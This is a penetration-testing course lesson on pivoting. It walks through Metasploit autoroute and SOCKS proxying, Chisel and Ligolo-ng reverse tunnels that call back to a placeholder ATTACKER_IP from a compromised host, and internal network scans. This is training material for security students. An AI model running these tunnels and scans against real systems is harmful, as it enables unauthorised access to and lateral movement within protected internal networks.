# Pivoting Techniques

## Unit 9 - Topic 1 | Pivoting and Lateral Movement

---

## Overview

**Pivoting** uses a compromised system as a relay to access networks that are not directly reachable from the attacker's machine. It's essential when target systems are on internal networks behind firewalls, segmented VLANs, or restricted subnets.

---

## 1. Why Pivoting Is Needed

```
NETWORK TOPOLOGY REQUIRING PIVOT:

INTERNET                     DMZ                    INTERNAL NETWORK
                        ┌──────────┐           ┌──────────────────┐
┌──────────┐  Firewall  │ WEB SRV  │  Firewall │  DB Server       │
│ ATTACKER │ ─────────→ │ 10.0.1.5 │ ────────→ │  10.0.2.10       │
│ External │     ❌      │ (Compromised)│   ❌    │  (Target)        │
└──────────┘  Blocked   └──────────┘  Blocked  │  DC: 10.0.2.1    │
                              │                 │  File: 10.0.2.20  │
                              │   CAN ACCESS    │                   │
                              └────────✅────────┘
                              
SOLUTION: Use compromised web server as PIVOT POINT
to reach internal 10.0.2.0/24 network!

PIVOT TYPES:
├── Port Forwarding — Forward specific ports
├── SOCKS Proxy — Route any TCP traffic
├── VPN Tunnel — Full network-layer pivot
├── SSH Tunnel — Encrypted port forwards
└── Double Pivot — Chain through multiple hosts
```

---

## 2. Metasploit Pivoting

```bash
# === AUTOROUTE (Meterpreter) ===
# After getting Meterpreter on 10.0.1.5:
meterpreter> run autoroute -s 10.0.2.0/24
# OR:
meterpreter> run post/multi/manage/autoroute
# Adds route through the Meterpreter session

# Verify routes:
meterpreter> run autoroute -p
# Active routes:
# 10.0.2.0/24 via Session 1

# Now use Metasploit modules against internal network:
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.2.0/24
set PORTS 22,80,443,445,3389
run

# === SOCKS PROXY (for external tools) ===
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Configure proxychains (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Use external tools through proxy:
# proxychains nmap -sT -Pn 10.0.2.10
# proxychains curl http://10.0.2.10
# proxychains ssh user@10.0.2.10
```

---

## 3. Chisel (Modern Pivoting Tool)

```bash
# === CHISEL — Fast TCP/UDP Tunneling ===
# Lightweight, single binary, cross-platform

# ATTACKER (Server):
./chisel server --reverse --port 8080
# Listens for Chisel client connections

# COMPROMISED HOST (Client):
./chisel client ATTACKER_IP:8080 R:socks
# Creates SOCKS5 proxy on attacker's port 1080

# === SPECIFIC PORT FORWARD ===
# Forward internal RDP:
./chisel client ATTACKER_IP:8080 R:3389:10.0.2.10:3389
# Attacker accesses localhost:3389 → reaches 10.0.2.10:3389

# Forward multiple ports:
./chisel client ATTACKER_IP:8080 \
  R:8081:10.0.2.10:80 \
  R:8082:10.0.2.20:445 \
  R:socks

# === DOUBLE PIVOT WITH CHISEL ===
# Host 1 → Host 2 → Host 3 (Target)
# On Host 1: chisel client ATTACKER:8080 R:socks
# Upload chisel to Host 2 via Host 1
# On Host 2: chisel client HOST1_INTERNAL:9090 R:socks
# Chain the SOCKS proxies
```

---

## 4. Ligolo-ng (Modern Tunneling)

```bash
# === LIGOLO-NG — Advanced Pivoting Framework ===
# Creates TUN interface — acts like VPN!
# No SOCKS needed — tools work natively

# ATTACKER (Proxy Server):
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# COMPROMISED HOST (Agent):
./agent -connect ATTACKER_IP:11601 -ignore-cert

# On attacker — select session and start:
session       # Select agent
start         # Start tunnel

# Add route to internal network:
sudo ip route add 10.0.2.0/24 dev ligolo

# NOW: Tools work directly!
nmap -sV 10.0.2.0/24          # No proxychains needed!
crackmapexec smb 10.0.2.0/24  # Direct access!
ssh user@10.0.2.10             # Just works!

# === ADVANTAGES OVER SOCKS ===
# ├── No proxychains needed
# ├── Supports ICMP (ping works!)
# ├── Supports UDP
# ├── TUN interface = transparent
# └── Better performance
```

---

## 5. Pivot Selection Guide

| Tool | Type | Best For |
|------|------|---------|
| **Metasploit autoroute** | Route + SOCKS | Already in Metasploit session |
| **SSH tunnels** | Port forward + SOCKS | Linux targets with SSH |
| **Chisel** | SOCKS + port forward | Quick, cross-platform |
| **Ligolo-ng** | TUN/VPN tunnel | Best overall — transparent |
| **sshuttle** | VPN over SSH | Linux → Linux pivot |
| **Socat** | Port forward | Simple single-port relay |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Pivoting** | Route through compromised host to reach internal networks |
| **autoroute** | Metasploit routing through Meterpreter |
| **SOCKS proxy** | Generic proxy for routing any TCP tool |
| **Chisel** | Modern, fast tunneling tool (single binary) |
| **Ligolo-ng** | Creates TUN interface — most transparent |
| **proxychains** | Route external tools through SOCKS proxy |

---

## Quick Revision Questions

1. **Why is pivoting necessary in penetration testing?**
2. **How does Metasploit's autoroute work?**
3. **What is the advantage of Ligolo-ng over SOCKS proxies?**
4. **How do you use Chisel for reverse SOCKS proxy?**
5. **What is a double pivot?**

---

[Next: SSH Tunneling →](02-ssh-tunneling.md)

---

*Unit 9 - Topic 1 of 6 | [Back to README](../README.md)*
